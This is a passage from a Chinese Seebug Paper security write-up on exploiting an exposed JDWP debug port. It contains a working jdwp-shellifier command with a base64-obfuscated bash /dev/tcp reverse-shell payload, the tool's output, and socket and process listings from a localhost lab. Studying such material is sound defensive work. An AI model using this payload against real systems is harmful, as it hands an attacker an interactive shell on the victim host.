{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}'`
最终我们得到的结果就是:

    
    
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}'
    [+] Targeting '127.0.0.1:9999'
    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_191'
    [+] Found Runtime class: id=1511
    [+] Found Runtime.getRuntime(): id=7f2bb8046360
    [+] Created break event id=2
    [+] Waiting for an event on 'java.lang.String.indexOf'
    [+] Received matching event from thread 0x15fd
    [+] Selected payload 'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}'
    [+] Command string object created id:15fe
    [+] Runtime.getRuntime() returned context id:0x15ff
    [+] found Runtime.exec(): id=7f2bb8010410
    [+] Runtime.exec() successful, retId=1600
    [!] Command successfully executed

最终成功地触发了反弹shell。

#### JDWP反弹流程

上面是从`jdwp-shellifier`的源代码上面对利用进行了分析，那么我们还是来分析一下在exploit过程中的端口和进程的变化。
在`indexOf`加上断点：

    
    
    (jdwp-rce/ss -anptw | grep 9999
    tcp  LISTEN     0      1                  0.0.0.0:9999             0.0.0.0:*     users:(("java",pid=9822,fd=4))                                                 
    tcp  TIME-WAIT  0      0                127.0.0.1:50644          127.0.0.1:9999                                                                                 
     (jdwp-rce/ss -anptw | grep 9999
    tcp  ESTAB     0      0                127.0.0.1:9999           127.0.0.1:50670  users:(("java",pid=9822,fd=5))                                                 
    tcp  ESTAB     0      0                127.0.0.1:50670          127.0.0.1:9999   users:(("python",pid=9978,fd=3))                                               
     (jdwp-rce/lsof -i:9999
    COMMAND  PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    java    9822 username    5u  IPv4 366738      0t0  TCP localhost:9999->localhost:50670 (ESTABLISHED)
    python  9978 username    3u  IPv4 366868      0t0  TCP localhost:50670->localhost:9999 (ESTABLISHED)

此时是`Python`和`java`进行通信。而此时的`12345`端口只有`nc`的监听端口。

    
    
    (jdwp-rce/ss -anptw | grep 12345
    tcp  LISTEN    0      1                  0.0.0.0:12345            0.0.0.0:*      users:(("nc",pid=9977,fd=3))

此时执行访问`localhost:8888`，触发`indexOf()`方法的执行。此时观察：

    
    
    (jdwp-rce/ss -anptw | grep 12345
    tcp  LISTEN     0      1                  0.0.0.0:12345            0.0.0.0:*     users:(("nc",pid=9977,fd=3))                                                   
    tcp  ESTAB      0      0                127.0.0.1:12345          127.0.0.1:51406 users:(("nc",pid=9977,fd=4))                                                   
    tcp  ESTAB      0      0                127.0.0.1:51406          127.0.0.1:12345 users:(("bash",pid=10120,fd=2),("bash",pid=10120,fd=1),("bash",pid=10120,fd=0))
     (jdwp-rce/lsof -i:12345
    COMMAND   PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    nc       9977 username    3u  IPv4 363961      0t0  TCP *:12345 (LISTEN)
    nc       9977 username    4u  IPv4 363962      0t0  TCP localhost:12345->localhost:51406 (ESTABLISHED)
    bash    10120 username    0u  IPv4 370930      0t0  TCP localhost:51406->localhost:12345 (ESTABLISHED)
    bash    10120 username    1u  IPv4 370930      0t0  TCP localhost:51406->localhost:12345 (ESTABLISHED)
    bash    10120 username    2u  IPv4 370930      0t0  TCP localhost:51406->localhost:12345 (ESTABLISHED)
    (jdwp-rce/ps -ef | grep 10120
    username  10120 10107  0 17:31 pts/0    00:00:00 /bin/bash -i

可以看到`/bin/bash
-i`和`nc`已经建立了`ESTABLISHED`的连接，从而实现了反弹shell。为什么是这个样子？其实通过前面的分析，其实已经可以知道`JDWP`反弹shell的原理本质上还是利用的`Runtime.getRuntime().exec("bash
-i >& /dev/tcp/ip/port 0>&1");`这种方式反弹shell，所以本质上和`JAVA`并没有关系。最后的分析也证实了这一点。

### 总结

总体来说，无论什么样类型的反弹shell，其实本质上都是固定的那几种方式，可能就是前面需要绕过或者是变形一下而已。

#### 参考

  1. <https://www.ibm.com/developerworks/cn/java/j-lo-jpda3/index.html>
  2. <https://ioactive.com/hacking-java-debug-wire-protocol-or-how/>
  3. <https://qsli.github.io/2018/08/12/jdwp/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/933/>

